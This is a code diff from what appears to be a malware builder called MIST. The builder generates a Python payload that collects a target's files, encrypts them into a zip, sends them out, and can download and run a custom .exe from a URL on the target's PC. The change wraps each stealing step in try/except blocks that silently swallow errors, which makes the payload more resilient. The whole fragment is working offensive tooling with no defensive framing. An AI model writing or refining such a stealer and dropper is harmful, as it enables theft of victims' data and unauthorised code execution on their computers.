@@ -64,9 +64,9 @@ if custom_download == '1':
     code = import_module('MIST_custom_payload', code)
     url = ask(None, 'Enter your URL >> ', 'Do you want MIST to download custom .exe(by URL) to target\'s PC and run it?\n  [ 1 ] - Yes\n  [ 2 ]  - No')
 
-code += f'\ncollect_files({paths}, "{session}")'
-code += f'\nencrypt_data({key}, "{session}.zip")'
-code += f'\nsend_file({args})'
+code += f'\ntry:\n    collect_files({paths}, "{session}")\nexcept:\n    pass'
+code += f'\ntry:\n    encrypt_data({key}, "{session}.zip")\nexcept:\n    pass'
+code += f'\ntry:\n    send_file({args})\nexcept:\n    pass'
 if custom_download == '1':
     code += f'\ndownload_executable("{url}")'
 open(f'{session}.py', 'w').write(code)
